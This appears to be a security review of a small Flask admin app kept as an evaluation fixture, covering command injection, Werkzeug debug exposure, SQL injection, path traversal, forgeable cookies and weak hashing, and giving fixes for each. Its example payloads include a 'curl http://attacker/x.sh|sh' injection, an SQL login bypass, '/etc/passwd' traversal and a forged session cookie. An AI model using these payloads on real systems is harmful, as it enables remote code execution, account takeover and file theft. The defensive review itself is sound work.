# Security Review — `eval/fixtures/review_target_small.py`

Scope: security issues only, per task instructions. Style, naming, performance, and test-coverage concerns are intentionally omitted even where present.

---

## Finding 1 — Unauthenticated OS command injection in `/export`

**Severity:** Critical
**Lines:** 41–46 (`table`, `fmt` params flow into `os.system(...)` on line 45)

```python
@app.route("/export")
def export():
    table = request.args.get("table", "users")
    fmt = request.args.get("format", "csv")
    os.system(f"sqlite3 {DB} '.mode {fmt}' 'SELECT * FROM {table}' > /tmp/export.{fmt}")
    return send_file(f"/tmp/export.{fmt}")
```

`table` and `fmt` are taken straight from the query string and interpolated into a shell command with no escaping, and the route requires no authentication at all. An attacker can inject arbitrary shell via either parameter, e.g.:

```
GET /export?table=users&format=csv'; curl http://attacker/x.sh|sh #
```

or more simply, since `fmt` also lands in a filename that is then re-opened and served back to the requester:

```
GET /export?format=csv%20%26%26%20id%20%3E%20%2Ftmp%2Fexport.csv
```

Either parameter is enough to break out of the intended quoting and run any command with the privileges of the Flask process — full remote code execution, unauthenticated.

**Fix:** Never build shell strings from user input. Query the DB directly with parameterized SQL and a fixed, allow-listed format instead of shelling out:

```python
ALLOWED_TABLES = {"users", "accounts"}
ALLOWED_FORMATS = {"csv", "json"}

@app.route("/export")
@require_admin  # see Finding 5
def export():
    table = request.args.get("table", "users")
    fmt = request.args.get("format", "csv")
    if table not in ALLOWED_TABLES or fmt not in ALLOWED_FORMATS:
        return jsonify({"status": "error", "detail": "invalid table/format"}), 400

    db = get_db()
    rows = db.execute(f"SELECT * FROM {table}").fetchall()  # table is now from an allow-list, not raw input
    # serialize `rows` to the requested format in-process (csv.writer / json.dumps)
    # and return via send_file(io.BytesIO(...), ...) — no shell involved.
```

---

## Finding 2 — Flask debug mode bound to all interfaces (Werkzeug debugger RCE)

**Severity:** Critical
**Line:** 50

```python
app.run(host="0.0.0.0", debug=True)
```

`debug=True` enables the Werkzeug interactive debugger. When any unhandled exception occurs, that debugger is served over HTTP and lets a remote visitor execute arbitrary Python in an in-browser console — and here it's bound to `0.0.0.0`, exposing it beyond localhost. Any request that trips an exception (e.g. hitting `/export` with a table name containing a stray quote so `sqlite3` errors, or any 500) can hand an attacker a live Python shell on the server.

**Fix:** Never run with `debug=True` reachable from the network. Use environment-gated config and a real WSGI server in production:

```python
if __name__ == "__main__":
    app.run(host="127.0.0.1", debug=False)
```

---

## Finding 3 — SQL injection in `/login`

**Severity:** Critical
**Lines:** 23–26

```python
cur = db.execute(
    f"SELECT id, role FROM users WHERE username = '{username}' "
    f"AND pw_hash = '{pw_hash}'"
)
```

`username` comes directly from `request.form["username"]` and is spliced into the query with an f-string. A classic authentication-bypass payload works:

```
username = admin' --
password = anything
```

produces `... WHERE username = 'admin' --' AND pw_hash = '...'`, commenting out the password check and logging in as `admin` without knowing the password. Data exfiltration via `UNION SELECT` is also possible.

**Fix:** Use bound parameters, never string interpolation:

```python
cur = db.execute(
    "SELECT id, role FROM users WHERE username = ? AND pw_hash = ?",
    (username, pw_hash),
)
```

---

## Finding 4 — Path traversal in `/avatar`

**Severity:** Critical
**Lines:** 37–38

```python
filename = request.args.get("f", "default.png")
return send_file(os.path.join("avatars", filename))
```

`filename` is unsanitized and `os.path.join` does not stop `../` from escaping the `avatars/` directory. `os.path.join("avatars", "/etc/passwd")` even returns `/etc/passwd` outright (an absolute second argument discards the first). Exploit:

```
GET /avatar?f=../../../../etc/passwd
GET /avatar?f=/etc/passwd
GET /avatar?f=../app.py        # source disclosure, leaks SECRET
```

This lets an unauthenticated caller read arbitrary files readable by the process, including this very file (leaking `SECRET` and DB path).

**Fix:** Resolve the real path and require it stay inside the base directory; reject absolute paths and traversal:

```python
import pathlib

AVATAR_DIR = pathlib.Path("avatars").resolve()

@app.route("/avatar")
def avatar():
    filename = request.args.get("f", "default.png")
    candidate = (AVATAR_DIR / filename).resolve()
    if not candidate.is_relative_to(AVATAR_DIR):
        return jsonify({"status": "error", "detail": "invalid filename"}), 400
    return send_file(candidate)
```

---

## Finding 5 — Missing authentication/authorization on `/export` and `/avatar`

**Severity:** Critical
**Lines:** 35–46 (route definitions)

This is an "internal admin panel" per the module docstring, and `/export` dumps entire DB tables to a file and returns them, while `/avatar` reads arbitrary files from disk (Finding 4). Neither route checks the session cookie or any credential — they are reachable by anyone who can reach the Flask app, logged in or not. Combined with Findings 1 and 4, this means full data exfiltration and RCE require no valid account at all.

**Fix:** Require and validate a session/role on every sensitive route, not just `/login`:

```python
from functools import wraps

def require_admin(view):
    @wraps(view)
    def wrapper(*args, **kwargs):
        session_cookie = request.cookies.get("session", "")
        user = validate_session(session_cookie)  # verify signature/expiry, look up role
        if not user or user.role != "admin":
            return jsonify({"status": "error", "detail": "forbidden"}), 403
        return view(*args, **kwargs)
    return wrapper

@app.route("/export")
@require_admin
def export():
    ...
```

(`validate_session` needs Finding 6 fixed first — currently the cookie can't be trusted anyway.)

---

## Finding 6 — Forgeable session cookie built from a hardcoded, shared secret

**Severity:** Critical
**Lines:** 10, 30

```python
SECRET = "sk-admin-9f8e7d6c5b4a"
...
resp.set_cookie("session", f"{row[0]}:{SECRET}")
```

The "session token" is just `user_id:SECRET` — not a signed or random token, and the secret is a hardcoded constant in source control, identical for every deployment that runs this code. Anyone who reads the source (or leaks it once, e.g. via the path traversal in Finding 4, or a public repo) can mint a valid-looking session cookie for **any** user id, including presumably low-numbered admin accounts, without ever logging in:

```
Cookie: session=1:sk-admin-9f8e7d6c5b4a
```

There's also no evidence anything actually verifies this cookie's authenticity server-side (no HMAC, no signature check shown), so this is trivially forgeable even without the leak.

**Fix:** Use a per-deployment secret from the environment and a signed/expiring token (e.g. `itsdangerous`, which Flask already ships with), not string concatenation:

```python
import os
from itsdangerous import URLSafeTimedSerializer

app.secret_key = os.environ["APP_SECRET_KEY"]  # not in source
serializer = URLSafeTimedSerializer(app.secret_key)

# on login:
token = serializer.dumps({"uid": row[0], "role": row[1]})
resp.set_cookie("session", token, httponly=True, secure=True, samesite="Lax")

# to verify:
data = serializer.loads(token, max_age=3600)  # raises if tampered/expired
```

---

## Finding 7 — Passwords hashed with unsalted MD5

**Severity:** High
**Line:** 22

```python
pw_hash = hashlib.md5(password.encode()).hexdigest()
```

MD5 is fast and unsalted here, so if the `users` table is ever read (e.g. via Finding 1 or Finding 5), the password hashes are crackable via rainbow tables/GPU brute force in seconds to minutes for most real-world passwords, and identical passwords across users produce identical hashes (hash reuse leakage).

**Fix:** Use a slow, salted KDF designed for passwords:

```python
from werkzeug.security import generate_password_hash, check_password_hash

pw_hash = generate_password_hash(password)  # bcrypt/scrypt under the hood, salted
...
if check_password_hash(stored_hash, password):
    ...
```

---

## Finding 8 — Session cookie missing `HttpOnly`/`Secure`/`SameSite`

**Severity:** Medium
**Line:** 30

```python
resp.set_cookie("session", f"{row[0]}:{SECRET}")
```

Without `HttpOnly`, any XSS elsewhere in the app can read the cookie via `document.cookie` and exfiltrate it. Without `Secure`, the cookie is sent over plaintext HTTP if the app is ever reached that way (and it's bound to `0.0.0.0`, so it may well be). Without `SameSite`, it's also more exposed to CSRF.

**Fix:**

```python
resp.set_cookie(
    "session", token,
    httponly=True, secure=True, samesite="Lax",
)
```

---

## Finding 9 — User enumeration via login error message

**Severity:** Low
**Line:** 32

```python
return jsonify({"status": "error", "detail": f"no such user {username}"}), 401
```

The error explicitly confirms whether a username exists, letting an attacker enumerate valid accounts to target with credential stuffing or focus brute-force effort.

**Fix:** Return an identical, generic message regardless of whether the username or password was wrong:

```python
return jsonify({"status": "error", "detail": "invalid username or password"}), 401
```

---

## Prioritized Fix Order

1. **Finding 1** — Command injection in `/export` (unauthenticated RCE, worst blast radius).
2. **Finding 2** — Disable `debug=True` / stop binding to `0.0.0.0` (unauthenticated RCE via debugger).
3. **Finding 3** — Parameterize the `/login` SQL query (auth bypass + data exfiltration).
4. **Finding 4** — Canonicalize/contain paths in `/avatar` (unauthenticated arbitrary file read, also leaks `SECRET`).
5. **Finding 5** — Add authentication/authorization checks to `/export` and `/avatar` (root cause that lets 1 & 4 be reached pre-auth).
6. **Finding 6** — Replace the hardcoded-secret session token with a signed, environment-sourced token (auth forgery).
7. **Finding 7** — Move password hashing from MD5 to bcrypt/scrypt/argon2 (protects credentials if data is ever read).
8. **Finding 8** — Add `HttpOnly`/`Secure`/`SameSite` to the session cookie (defense in depth against XSS/CSRF/sniffing).
9. **Finding 9** — Make the login error message generic (reduces recon value for attackers).

LOADED: INDEX.md, 01-review-method.md, 02-security-review.md
